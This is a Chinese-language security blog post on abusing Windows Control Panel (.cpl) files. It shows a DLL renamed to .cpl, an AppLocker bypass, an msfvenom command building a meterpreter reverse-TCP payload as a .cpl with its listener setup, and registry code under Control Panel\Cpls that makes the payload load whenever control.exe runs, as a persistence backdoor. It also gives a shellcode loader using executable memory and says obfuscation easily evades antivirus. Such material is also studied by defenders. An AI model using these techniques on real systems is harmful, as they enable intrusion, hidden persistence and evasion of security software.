> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/L7EsdazUxJQYj0f40NFh6A)

**文章首发先知社区：https://xz.aliyun.com/t/9957**

前言
--

最近无意间发现了cpl文件,之前对该类型的文件了解几乎为零,由于触及到我的知识盲区,于是决定探究。

cpl文件
-----

CPL文件，是Windows控制面板扩展项，CPL全拼为`Control Panel Item`在system32目录下有一系列的cpl文件,分别对应着各种控制面板的子选项

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWIgYmJmpCWODK1MGhTKbWibqrf6icLpFqp7jhYghmZdOdz89WYxrWfn7g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

列入我们`win+R`输入`main.cpl`  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaW0oghuZz5jC7icXOniaNoOovhFSaoN1d9be9YMic9QZoZ8rayPj8YibEicqw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

将会打开控制面板中的鼠标属性  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWSKRPRdu0lL7TaOVpN2A68phfRG2ULRYq1Yntzsf0jMQjWIKkj2B6lg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

cpl文件本质是属于PE文件  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWd0kWB5MIUr6ZBEoknxydG7SI5VOVC4FZbY8TPEnkbhTboG69TFia0Yg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

但cpl并不像exe,更像是dll,无法直接打开,只能以加载的形式运行。并且有一个导出函数`CPlApplet`该函数是控制面板应用程序的入口点，它被控制面板管理程序自动调用，且是个回调函数。  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWibzolgBLABGicT01HzJG91xm0YTcnkgMdqSLws9xhBsEuC9YM13OjJZg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

如何打开cpl
-------

1.  双击或者win+r xxx.cpl 
    
2.  control <文件名> 
    
3.  rundll32 shell32.dll,Control_RunDLL <文件名> 注意：所有rundll32 shell32.dll,Control_RunDLL的命令均可用control替代，control.exe实质调用了rundll32.exe。打开后找不到control.exe进程，只能找到rundll32.exe。  
    

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWTNwv0AuOFbemU0KcL5By1bkibM1lBFZEDEMtmy5pEichQPHLwxhs9Djw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

4.vbs脚本  

```
Dim obj  
Set obj = CreateObject("Shell.Application")  
obj.ControlPanelItem("C:\Users\11793\Desktop\cpl.cpl")  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWOZmibwUtCLQhKnBibqYnK3npAbGiaV6SZJG2ZJJDpEfxQt5icyxThH0F6g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

5.js脚本  

```
var a = new ActiveXObject("Shell.Application");  
a.ControlPanelItem("C:\\Users\\11793\\Desktop\\cpl.cpl");  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWnpZHGDbJpyQKdcXsUnm0t5yOM7eqY0PDib0W4jMGlXQbYrfsAbgphbw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

如何自己制造一个cpl文件  

----------------

最简单的方式:直接创建一个dll,无需导出函数,然后改后缀名

```
BOOL APIENTRY DllMain( HMODULE hModule,  
                       DWORD  ul_reason_for_call,  
                       LPVOID lpReserved  
                     )  
{  
    switch (ul_reason_for_call)  
    {  
    case DLL_PROCESS_ATTACH:  
        WinExec("Calc.exe", SW_SHOW);  
    case DLL_THREAD_ATTACH:  
    case DLL_THREAD_DETACH:  
    case DLL_PROCESS_DETACH:  
        break;  
    }  
    return TRUE;  
}  

```

随便一种方式执行

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWMsDQSAe1PTrOpGjaQWekzc2E7U3QlC5vgicBoO852Mdoeeic1ezqf5cA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

这里既然可以弹出calc.exe,那么能不能执行自己的payload的呢,答案是肯定的。

cpl文件的应用
--------

### bypass Windows AppLocker

什么是`Windows AppLocker`: AppLocker即“应用程序控制策略”，是Windows 7系统中新增加的一项安全功能。在win7以上的系统中默认都集成了该功能。

默认的Applocker规则集合,可以看到cpl并不在默认规则中:

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWVySS0bgPmq4xNLmKnEML0EJE5aiaiaKib2Dhoyp1YwTQqXicnPkF8CqO9A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

开启Applocker规则: 打开计算机管理,选择服务,将`Application Identity`服务开启

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWuRibxIbcN0yHQQcVpRicxznSrzj02yOaBESvttqrWbZA9yVfJbzzYpiaw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

然后在安全策略中,添加一条applocker规则,会询问是否添加默认规则

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWWbJZsLR3ZqOxAje7xib6nunlg5HVImNOFRFQKASIAhtKibXsf7box4zw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

默认规则为:

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWnLibvibysG2T7CuLpNZkJo1QKdKmIQVTmarRmybBEGO1E8DwJdyFBVeA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

假设设置某一路径无法执行可执行程序,再次运行时就会提示组策略安全,不允许运行

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWuT2I2k0dMwnQL4Jh3OTSNn5YN1WLrSoLC7NDwfLP7bVdnzxxfCzmJA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

绕过的方式有很多,这里只讲cpl文件 完全可以把代码写入到cpl文件中,同样达到执行目的,这里就弹一个cmd

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWt7BicHx8C4LzibLGwDrEqxtoXjkl8A57LgLBibGTVicM9CBWo4bYjoQjYg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### msf直接生成cpl文件

生成cpl文件`msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' lhost=192.168.111.128 lport=8877 -f dll -o cpl.cpl`

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWYeRB96k2I2fJUSZCN2NmrvBCqiaRA77Ph7fNLTnGml4r2ia9XnvdIdWw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

将文件拖到本地并运行,msf监听

*   use exploit/multi/handler
    
*   set payload windows/meterpreter/reverse_tcp
    
*   set lhost 192.168.111.128
    
*   set lport 8877
    
*   exploit
    

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaW3oOiaNlmzcT1Ia38cMtogXCJyxrbDcJfIMcXicujBPvfjXUa4AeIuudw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

这样肯定是不够的,可以把这个cpl文件当作一个后门,做到一个权限维持的效果,且比较隐蔽。将cpl文件名称改为`test.cpl`创建一个项目,作用为修改注册表:

  

```
HKEY hKey;  
DWORD dwDisposition;  
char path[] = "C:\\test.cpl";  
RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition);  
RegSetValueExA(hKey, "test.cpl", 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path)));  

```

不一定将cpl文件放到c盘更目录,可以自定义路径 执行后

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWNnwo8dbaiby5icoVCIONaJWFEpicVg7micfC4w5TVSGbpHbS0stbg3WUJg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

然后这里在开启control.exe时,test.cpl文件也会被打开。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWvQJQT2B20Q04IIoqEFl3ibtmsVf29iaRLK5KnjLIic19HqQj0DgGYfOww/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

如果目标主机有杀软,可以通过该方法白加黑绕过,但是msf的cpl文件特征非常明显,静态太概率都会被杀掉。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWBS5O8nSwmhfr4NiciacLHiaNib1rrFRicRgdozV7Eva2xvEVblrdX7m56fQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

除了加壳之外,寄希望于自己实现加载shellcode,方便做混淆。

  

### 使用shellcode自己做一个cpl文件

直接上代码

```
#include "pch.h"  
#include "windows.h"  
  
extern "C" __declspec(dllexport) VOID CPlApplet(HWND hwndCPl, UINT msg, LPARAM lParam1, LPARAM lParam2)  
{  
    MessageBoxA(0, NULL, "test", MB_OK);  
    /* length: 835 bytes */  
    unsigned char buf[] = "shellcode";  
    LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);  
    memcpy(Memory, buf, sizeof(buf));  
    ((void(*)())Memory)();  
}  
BOOL APIENTRY DllMain( HMODULE hModule,  
                       DWORD  ul_reason_for_call,  
                       LPVOID lpReserved  
                     )  
{  
    switch (ul_reason_for_call)  
    {  
    case DLL_PROCESS_ATTACH:  
    case DLL_THREAD_ATTACH:  
    case DLL_THREAD_DETACH:  
    case DLL_PROCESS_DETACH:  
        break;  
    }  
    return TRUE;  
}  

```

这是最最最最基础的loader 先打开`control.exe`看看效果

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWGtc5sF3jDcu8RDxe50JCcpQbQbgaviaIPI35VG5x5q4rJrg6ibrS9Law/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

看看查杀率

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWmKgic8PL4PuEQDR6qkYBLFp61TAPicO9f9luhPkPkJKheAt8ialMjeiaug/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

这里上传的文本,shellcode没有做任何的处理,查杀率已经算比较低的,如果混淆一下,很轻松的就可以静态过杀软,再用白加黑,是不是想想就很轻松呢。

  

经过一系列处理后,找杀毒能力还比较强的360试一下![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7yX8Wk9KMfMWUPhG49PiciaWIlsqh0rQUWaUoWUSM2EIvfkNYgFTLTOmnzO8DhvLhY36kYFiczyNFeQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

参考
--

https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html

https://attack.mitre.org/techniques/T1218/002/

https://docs.microsoft.com/zh-cn/windows/security/threat-protection/windows-defender-application-control/applocker/working-with-applocker-rules

加下方wx，拉你进群学习

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v4WZgYJeibL4XoXol2MibfTeNPUTuUmqkgMFFf3icptn2CEN5kJEOOPWMg7STl235fSLQMgQ8GuSmWSg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

往期推荐

[

调用NtCreateUserProcess创建进程绕过杀软hook



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247495830&idx=1&sn=9db7f26e7dc9930214f3c101797e0ea4&chksm=ce674a2af910c33cc7b0af643955a0eb563c9191c6913a4f65ef5f7a55bd167b47362d377e0a&scene=21#wechat_redirect)

[

VEH&SEH异常详解



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247495677&idx=1&sn=a1c46690a308fd579c00624a01815d25&chksm=ce675541f910dc574237ba104eb4926b91090fb915ebdeda3a1495aa3f9cefc55fe8b3c12115&scene=21#wechat_redirect)

[

sql注入bypass最新版某狗



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247495616&idx=1&sn=6a40395292bab8c2cdf4fd77ed701201&chksm=ce67557cf910dc6acde72a11a53d82a2331f3d23aa031984376ea9143c5f3f157612a712e2bf&scene=21#wechat_redirect)

[

软件调试详解



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247495570&idx=1&sn=1eaf3a28aa19b1c676bc740359f79124&chksm=ce67552ef910dc38888ad1440e924455e61339fbcc38a805b9ce14b946b58d955d0826d2a2e5&scene=21#wechat_redirect)

[

初探windows异常处理



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247495224&idx=1&sn=7052bb8495ba625afffb53e1cb67182b&chksm=ce675484f910dd922edf20ac385d83910d1e4a4343e11bb9a926bce1834f4d18cda5df55449a&scene=21#wechat_redirect)

[

浅谈hook攻防



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247494646&idx=1&sn=18642da97929e4e6cb7bb46627a77883&chksm=ce67514af910d85c5c74b9e4d883ed423f6c07253836aa47d77fccdfa8931e77e8c9d236dc93&scene=21#wechat_redirect)

[

无处不在的dll劫持



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247494314&idx=1&sn=41e5f267a2640c9d461f2f2716b51660&chksm=ce675016f910d9007d30eb432a61ec64e835d7095c1260cccc0786970000edc7788c8bb18ba8&scene=21#wechat_redirect)

[

CVE-2021–26855与CVE-2021–27065分析及复现



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247494271&idx=1&sn=494c5be0aff6e7636457abf50042045f&chksm=ce6750c3f910d9d5818a5b54064058292fda5639fef69f816c6a6ec2b4448c0a4fc781192158&scene=21#wechat_redirect)

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6flNJqwg2VJrVbXvO9N2mzz6piagicPIiaCNPGH1tNA1N43RLy5bLY4PyUqNGYocicJMqrusALD0icibkg/0?wx_fmt=png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 66篇原创内容   公众号

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)